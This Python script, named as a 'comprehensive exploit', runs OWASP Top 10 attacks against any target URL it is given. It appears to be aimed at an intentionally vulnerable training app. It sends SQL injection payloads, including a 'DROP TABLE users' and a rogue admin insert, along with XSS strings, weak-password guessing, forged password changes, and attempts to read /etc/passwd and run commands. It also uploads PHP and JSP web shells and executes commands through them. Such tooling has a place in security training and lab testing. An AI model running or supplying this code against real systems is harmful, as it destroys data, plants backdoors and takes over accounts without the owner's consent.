#!/usr/bin/env python3

import requests
import sys
import time
import json
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class ComprehensiveExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities_found = []
        
    def banner(self):
        print("=" * 80)
        print("🎯 OWASP TOP 10 COMPREHENSIVE VULNERABILITY SCANNER & EXPLOITER")
        print("=" * 80)
        print(f"Target: {self.target_url}")
        print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
    
    def test_sql_injection(self):
        print("\n🔍 [1/10] Testing SQL Injection Vulnerabilities...")
        
        sqli_payloads = [
            ("admin' OR '1'='1' --", "Basic OR injection"),
            ("admin' UNION SELECT 1,2,3,4,5 --", "UNION injection"),
            ("'; DROP TABLE users; --", "Destructive injection"),
            ("admin' AND (SELECT COUNT(*) FROM users) > 0 --", "Blind injection"),
            ("admin' OR SLEEP(5) --", "Time-based injection"),
            ("admin'; INSERT INTO users VALUES (999,'hacker','hacked',1); --", "Insert injection")
        ]
        
        for payload, desc in sqli_payloads:
            data = {'username': payload, 'password': 'test'}
            
            try:
                start_time = time.time()
                response = self.session.post(f"{self.target_url}/login", data=data, timeout=10)
                response_time = time.time() - start_time
                
                if response.status_code == 302:
                    print(f"   ✅ {desc}: SUCCESS - Authentication bypassed!")
                    self.vulnerabilities_found.append(f"SQL Injection - {desc}")
                elif "error" in response.text.lower() and ("sql" in response.text.lower() or "syntax" in response.text.lower()):
                    print(f"   ⚠️  {desc}: SQL Error detected!")
                    self.vulnerabilities_found.append(f"SQL Error - {desc}")
                elif response_time > 4:
                    print(f"   ⚠️  {desc}: Time delay detected ({response_time:.2f}s)!")
                    self.vulnerabilities_found.append(f"Time-based SQLi - {desc}")
                else:
                    print(f"   ❌ {desc}: No injection detected")
                    
            except Exception as e:
                print(f"   ❌ {desc}: Error - {str(e)}")
        
        print(f"   📊 SQL Injection tests completed. Found: {len([v for v in self.vulnerabilities_found if 'SQL' in v])}")
    
    def test_xss_vulnerabilities(self):
        print("\n🔍 [2/10] Testing Cross-Site Scripting (XSS) Vulnerabilities...")
        
        xss_payloads = [
            ("<script>alert('XSS')</script>", "Basic script injection"),
            ("<img src=x onerror=alert('XSS')>", "Image tag injection"),
            ("<svg onload=alert('XSS')>", "SVG injection"),
            ("javascript:alert('XSS')", "JavaScript protocol"),
            ("<iframe src=javascript:alert('XSS')></iframe>", "Iframe injection"),
            ("'><script>alert('XSS')</script>", "Quote escape injection"),
            ("\"><script>alert('XSS')</script>", "Double quote escape"),
            ("<body onload=alert('XSS')>", "Event handler injection")
        ]
        
        for payload, desc in xss_payloads:
            params = {'q': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/search", params=params)
                
                if payload in response.text and "script" not in response.text.lower().replace(payload.lower(), ""):
                    print(f"   ✅ {desc}: REFLECTED XSS found!")
                    self.vulnerabilities_found.append(f"Reflected XSS - {desc}")
                else:
                    print(f"   ❌ {desc}: Not vulnerable")
                    
            except Exception as e:
                print(f"   ❌ {desc}: Error - {str(e)}")
        
        if self.login_test_user():
            print("   🔄 Testing Stored XSS in comments...")
            
            stored_payload = "<script>alert('Stored XSS')</script>"
            comment_data = {
                'postId': '1',
                'comment': stored_payload,
                'author': 'XSS_Tester'
            }
            
            try:
                response = self.session.post(f"{self.target_url}/comment", data=comment_data)
                if response.status_code == 302:
                    check_response = self.session.get(f"{self.target_url}/post/1")
                    if stored_payload in check_response.text:
                        print(f"   ✅ Stored XSS: SUCCESS - Persistent payload!")
                        self.vulnerabilities_found.append("Stored XSS - Comment injection")
                    else:
                        print(f"   ❌ Stored XSS: Payload filtered or escaped")
                else:
                    print(f"   ❌ Stored XSS: Comment submission failed")
            except Exception as e:
                print(f"   ❌ Stored XSS: Error - {str(e)}")
        
        print(f"   📊 XSS tests completed. Found: {len([v for v in self.vulnerabilities_found if 'XSS' in v])}")
    
    def test_broken_authentication(self):
        print("\n🔍 [3/10] Testing Broken Authentication & Session Management...")
        
        weak_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('root', 'root'),
            ('user', 'user'),
            ('test', 'test')
        ]
        
        print("   🔑 Testing weak credentials...")
        for username, password in weak_credentials:
            data = {'username': username, 'password': password}
            
            try:
                response = self.session.post(f"{self.target_url}/login", data=data, allow_redirects=False)
                if response.status_code == 302:
                    print(f"   ✅ Weak credentials found: {username}:{password}")
                    self.vulnerabilities_found.append(f"Weak credentials - {username}:{password}")
                else:
                    print(f"   ❌ Failed: {username}:{password}")
            except:
                pass
        
        print("   🍪 Testing session security...")
        
        if self.login_test_user():
            cookies = self.session.cookies
            
            for cookie in cookies:
                if not cookie.secure:
                    print(f"   ⚠️  Cookie '{cookie.name}' not marked as Secure")
                    self.vulnerabilities_found.append(f"Insecure cookie - {cookie.name}")
                
                if not hasattr(cookie, 'httponly') or not cookie.get('httponly'):
                    print(f"   ⚠️  Cookie '{cookie.name}' not marked as HttpOnly")
                    self.vulnerabilities_found.append(f"Non-HttpOnly cookie - {cookie.name}")
        
        print(f"   📊 Authentication tests completed. Found: {len([v for v in self.vulnerabilities_found if any(x in v for x in ['credentials', 'cookie', 'session'])])}")
    
    def test_sensitive_data_exposure(self):
        print("\n🔍 [4/10] Testing Sensitive Data Exposure...")
        
        sensitive_endpoints = [
            '/api/users',
            '/admin',
            '/config',
            '/.env',
            '/backup',
            '/database.db',
            '/phpinfo.php',
            '/server-status',
            '/server-info'
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    
                    if any(keyword in content_lower for keyword in ['password', 'secret', 'key', 'token', 'database']):
                        print(f"   ✅ Sensitive data exposed: {endpoint}")
                        self.vulnerabilities_found.append(f"Sensitive data exposure - {endpoint}")
                    elif len(response.text) > 100:
                        print(f"   ⚠️  Accessible endpoint: {endpoint}")
                        self.vulnerabilities_found.append(f"Information disclosure - {endpoint}")
                    else:
                        print(f"   ❌ No sensitive data: {endpoint}")
                else:
                    print(f"   ❌ Not accessible: {endpoint}")
                    
            except Exception as e:
                print(f"   ❌ Error testing {endpoint}: {str(e)}")
        
        print(f"   📊 Data exposure tests completed. Found: {len([v for v in self.vulnerabilities_found if 'exposure' in v or 'disclosure' in v])}")
    
    def test_xml_external_entities(self):
        print("\n🔍 [5/10] Testing XML External Entities (XXE)...")
        
        xxe_payloads = [
            ('{"data": "test"}', "JSON test"),
            ('{"cmd": "whoami"}', "Command injection attempt"),
            ('eval("console.log(\\"XXE Test\\")")', "JavaScript eval test"),
            ('require("fs").readFileSync("/etc/passwd")', "File read attempt")
        ]
        
        for payload, desc in xxe_payloads:
            params = {'xml': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/xml", params=params)
                
                if response.status_code == 200 and len(response.text) > 50:
                    if "root:" in response.text or "admin" in response.text.lower():
                        print(f"   ✅ {desc}: XXE/Code execution successful!")
                        self.vulnerabilities_found.append(f"XXE/Code Injection - {desc}")
                    else:
                        print(f"   ⚠️  {desc}: Payload processed, checking output...")
                        print(f"       Response: {response.text[:100]}...")
                else:
                    print(f"   ❌ {desc}: No execution detected")
                    
            except Exception as e:
                print(f"   ❌ {desc}: Error - {str(e)}")
        
        print(f"   📊 XXE tests completed. Found: {len([v for v in self.vulnerabilities_found if 'XXE' in v or 'Code Injection' in v])}")
    
    def test_broken_access_control(self):
        print("\n🔍 [6/10] Testing Broken Access Control (IDOR)...")
        
        if not self.login_test_user():
            print("   ❌ Could not login to test access control")
            return
        
        print("   🔍 Testing Insecure Direct Object References...")
        
        user_ids = range(1, 10)
        
        for user_id in user_ids:
            try:
                response = self.session.get(f"{self.target_url}/dashboard?userId={user_id}")
                
                if response.status_code == 200 and "email" in response.text.lower():
                    print(f"   ✅ IDOR found: Can access user {user_id} data")
                    self.vulnerabilities_found.append(f"IDOR - User {user_id} data accessible")
                else:
                    print(f"   ❌ User {user_id}: Access denied or no data")
                    
            except Exception as e:
                print(f"   ❌ Error testing user {user_id}: {str(e)}")
        
        print("   🔍 Testing privilege escalation...")
        
        try:
            response = self.session.get(f"{self.target_url}/admin")
            if response.status_code != 403:
                print(f"   ✅ Admin panel accessible without admin role!")
                self.vulnerabilities_found.append("Privilege escalation - Admin panel accessible")
            else:
                print(f"   ❌ Admin panel properly protected")
        except Exception as e:
            print(f"   ❌ Error testing admin access: {str(e)}")
        
        print(f"   📊 Access control tests completed. Found: {len([v for v in self.vulnerabilities_found if 'IDOR' in v or 'escalation' in v])}")
    
    def test_security_misconfiguration(self):
        print("\n🔍 [7/10] Testing Security Misconfiguration...")
        
        config_tests = [
            ('/robots.txt', 'Robots.txt disclosure'),
            ('/.git/config', 'Git configuration exposure'),
            ('/.env', 'Environment file exposure'),
            ('/config.php', 'Config file exposure'),
            ('/phpinfo.php', 'PHP info exposure'),
            ('/server-status', 'Server status exposure'),
            ('/debug', 'Debug endpoint'),
            ('/test', 'Test endpoint'),
            ('/backup', 'Backup files'),
            ('/logs', 'Log files access')
        ]
        
        for endpoint, desc in config_tests:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")
                
                if response.status_code == 200 and len(response.text) > 50:
                    print(f"   ✅ {desc}: Exposed!")
                    self.vulnerabilities_found.append(f"Security misconfiguration - {desc}")
                else:
                    print(f"   ❌ {desc}: Not accessible")
                    
            except Exception as e:
                print(f"   ❌ Error testing {desc}: {str(e)}")
        
        print("   🔍 Testing HTTP security headers...")
        
        try:
            response = self.session.get(self.target_url)
            headers = response.headers
            
            security_headers = [
                'X-Frame-Options',
                'X-XSS-Protection', 
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Permitted-Cross-Domain-Policies'
            ]
            
            for header in security_headers:
                if header not in headers:
                    print(f"   ⚠️  Missing security header: {header}")
                    self.vulnerabilities_found.append(f"Missing security header - {header}")
                else:
                    print(f"   ✅ Security header present: {header}")
                    
        except Exception as e:
            print(f"   ❌ Error checking headers: {str(e)}")
        
        print(f"   📊 Security misconfiguration tests completed. Found: {len([v for v in self.vulnerabilities_found if 'misconfiguration' in v or 'header' in v])}")
    
    def test_xss_csrf_combo(self):
        print("\n🔍 [8/10] Testing Cross-Site Request Forgery (CSRF)...")
        
        if not self.login_test_user():
            print("   ❌ Could not login to test CSRF")
            return
        
        print("   🔍 Testing CSRF protection on critical actions...")
        
        csrf_tests = [
            ('/change-password', {'newPassword': 'csrf-hacked'}, 'Password change'),
            ('/comment', {'postId': '1', 'comment': 'CSRF comment', 'author': 'CSRF_Bot'}, 'Comment posting')
        ]
        
        for endpoint, data, desc in csrf_tests:
            try:
                new_session = requests.Session()
                response = new_session.post(f"{self.target_url}{endpoint}", data=data)
                
                if response.status_code == 200 or response.status_code == 302:
                    print(f"   ✅ {desc}: CSRF vulnerable (no token required)!")
                    self.vulnerabilities_found.append(f"CSRF - {desc}")
                else:
                    print(f"   ❌ {desc}: CSRF protection detected")
                    
            except Exception as e:
                print(f"   ❌ Error testing {desc}: {str(e)}")
        
        print(f"   📊 CSRF tests completed. Found: {len([v for v in self.vulnerabilities_found if 'CSRF' in v])}")
    
    def test_insecure_deserialization(self):
        print("\n🔍 [9/10] Testing Insecure Deserialization...")
        
        print("   🔍 Testing JSON/Object injection...")
        
        deserialization_payloads = [
            ('{"__proto__": {"polluted": true}}', 'Prototype pollution'),
            ('{"constructor": {"prototype": {"polluted": true}}}', 'Constructor pollution'),
            ('eval("console.log(\\"Deserialization test\\")")', 'Direct eval injection'),
            ('require("child_process").exec("whoami")', 'Code execution attempt')
        ]
        
        for payload, desc in deserialization_payloads:
            try:
                headers = {'Content-Type': 'application/json'}
                response = self.session.post(f"{self.target_url}/api/users", 
                                           data=payload, headers=headers)
                
                if response.status_code == 200 and "error" not in response.text.lower():
                    print(f"   ⚠️  {desc}: Payload processed without error")
                    self.vulnerabilities_found.append(f"Potential deserialization - {desc}")
                else:
                    print(f"   ❌ {desc}: Payload rejected or error")
                    
            except Exception as e:
                print(f"   ❌ Error testing {desc}: {str(e)}")
        
        print(f"   📊 Deserialization tests completed. Found: {len([v for v in self.vulnerabilities_found if 'deserialization' in v])}")
    
    def test_insufficient_logging(self):
        print("\n🔍 [10/10] Testing Insufficient Logging & Monitoring...")
        
        print("   🔍 Testing attack detection and logging...")
        
        attack_patterns = [
            ("admin' OR '1'='1' --", "SQL injection"),
            ("<script>alert('XSS')</script>", "XSS attack"),
            ("../../../etc/passwd", "Path traversal"),
            ("eval('malicious code')", "Code injection"),
            ("UNION SELECT * FROM users", "SQL injection")
        ]
        
        for payload, attack_type in attack_patterns:
            try:
                if attack_type == "SQL injection":
                    data = {'username': payload, 'password': 'test'}
                    response = self.session.post(f"{self.target_url}/login", data=data)
                else:
                    params = {'q': payload}
                    response = self.session.get(f"{self.target_url}/search", params=params)
                
                print(f"   ⚠️  {attack_type}: Attack executed (should be logged)")
                
            except Exception as e:
                print(f"   ❌ Error executing {attack_type}: {str(e)}")
        
        print("   ℹ️  Note: Insufficient logging cannot be directly detected")
        print("   ℹ️  Check server logs for attack pattern detection")
        
        print(f"   📊 Logging tests completed.")
    
    def test_file_upload_vulnerabilities(self):
        print("\n🔍 [BONUS] Testing File Upload Vulnerabilities...")
        
        malicious_files = [
            ('webshell.php', '<?php system($_GET["cmd"]); ?>', 'PHP webshell'),
            ('xss.html', '<script>alert("File Upload XSS")</script>', 'HTML XSS'),
            ('malicious.svg', '<svg onload="alert(\'SVG XSS\')">', 'SVG XSS'),
            ('shell.jsp', '<%@ page import="java.io.*" %><%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>', 'JSP shell')
        ]
        
        for filename, content, desc in malicious_files:
            try:
                files = {'file': (filename, content, 'text/plain')}
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                if response.status_code == 200 and "uploaded successfully" in response.text:
                    print(f"   ✅ {desc}: Upload successful!")
                    self.vulnerabilities_found.append(f"File upload vulnerability - {desc}")
                    
                    if 'webshell.php' in filename:
                        test_url = f"{self.target_url}/uploads/{filename}?cmd=whoami"
                        test_response = self.session.get(test_url)
                        if test_response.status_code == 200 and len(test_response.text) > 10:
                            print(f"   🚨 CRITICAL: Webshell execution confirmed!")
                            
                else:
                    print(f"   ❌ {desc}: Upload failed")
                    
            except Exception as e:
                print(f"   ❌ Error testing {desc}: {str(e)}")
        
        print(f"   📊 File upload tests completed. Found: {len([v for v in self.vulnerabilities_found if 'upload' in v])}")
    
    def login_test_user(self):
        data = {'username': 'user', 'password': 'user123'}
        try:
            response = self.session.post(f"{self.target_url}/login", data=data)
            return "dashboard" in response.text.lower() or response.status_code == 302
        except:
            return False
    
    def generate_report(self):
        print("\n" + "=" * 80)
        print("📋 VULNERABILITY ASSESSMENT REPORT")
        print("=" * 80)
        
        print(f"🎯 Target: {self.target_url}")
        print(f"📅 Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🔍 Total Vulnerabilities Found: {len(self.vulnerabilities_found)}")
        
        if self.vulnerabilities_found:
            print("\n🚨 CRITICAL VULNERABILITIES IDENTIFIED:")
            print("-" * 50)
            
            vuln_categories = {}
            for vuln in self.vulnerabilities_found:
                category = vuln.split(' - ')[0]
                if category not in vuln_categories:
                    vuln_categories[category] = []
                vuln_categories[category].append(vuln)
            
            for category, vulns in vuln_categories.items():
                print(f"\n📂 {category.upper()}:")
                for vuln in vulns:
                    print(f"   • {vuln}")
            
            print(f"\n🔥 RISK ASSESSMENT:")
            risk_score = len(self.vulnerabilities_found) * 10
            if risk_score >= 100:
                risk_level = "CRITICAL"
            elif risk_score >= 70:
                risk_level = "HIGH"
            elif risk_score >= 40:
                risk_level = "MEDIUM"
            else:
                risk_level = "LOW"
            
            print(f"   Risk Score: {risk_score}/100")
            print(f"   Risk Level: {risk_level}")
            
        else:
            print("\n✅ No vulnerabilities detected (unlikely in a intentionally vulnerable app)")
        
        print("\n📝 RECOMMENDATIONS:")
        print("-" * 30)
        print("1. Implement input validation and parameterized queries")
        print("2. Add CSRF tokens to all state-changing operations")
        print("3. Implement proper session management")
        print("4. Add security headers to all responses")
        print("5. Validate and sanitize all file uploads")
        print("6. Implement proper access controls and authorization")
        print("7. Add comprehensive logging and monitoring")
        print("8. Regular security testing and code reviews")
        
        print("\n" + "=" * 80)
    
    def run_comprehensive_test(self):
        self.banner()
        
        try:
            print(f"\n🔄 Testing connectivity to {self.target_url}...")
            response = self.session.get(self.target_url, timeout=5)
            if response.status_code != 200:
                print(f"❌ Target not accessible (Status: {response.status_code})")
                return
            print(f"✅ Target is accessible")
            
        except Exception as e:
            print(f"❌ Cannot connect to target: {str(e)}")
            return
        
        # Run all vulnerability tests
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_broken_authentication()
        self.test_sensitive_data_exposure()
        self.test_xml_external_entities()
        self.test_broken_access_control()
        self.test_security_misconfiguration()
        self.test_xss_csrf_combo()
        self.test_insecure_deserialization()
        self.test_insufficient_logging()
        self.test_file_upload_vulnerabilities()
        
        # Generate comprehensive report
        self.generate_report()
        
        # Save results to file
        self.save_results_to_file()
    
    def save_results_to_file(self):
        try:
            report_data = {
                'target': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'vulnerabilities_found': self.vulnerabilities_found,
                'total_vulnerabilities': len(self.vulnerabilities_found)
            }
            
            filename = f"vulnerability_report_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            print(f"\n💾 Detailed report saved to: {filename}")
            
        except Exception as e:
            print(f"❌ Error saving report: {str(e)}")

def main():
    if len(sys.argv) != 2:
        print("🎯 OWASP Top 10 Comprehensive Vulnerability Scanner")
        print("=" * 50)
        print("Usage: python3 comprehensive_exploit.py <target_url>")
        print("Example: python3 comprehensive_exploit.py http://localhost:3000")
        print("\nThis tool will test for all OWASP Top 10 vulnerabilities:")
        print("1. SQL Injection")
        print("2. Cross-Site Scripting (XSS)")
        print("3. Broken Authentication")
        print("4. Sensitive Data Exposure")
        print("5. XML External Entities (XXE)")
        print("6. Broken Access Control")
        print("7. Security Misconfiguration")
        print("8. Cross-Site Request Forgery (CSRF)")
        print("9. Insecure Deserialization")
        print("10. Insufficient Logging & Monitoring")
        print("+ File Upload Vulnerabilities")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = ComprehensiveExploit(target_url)
    exploit.run_comprehensive_test()

if __name__ == "__main__":
    main()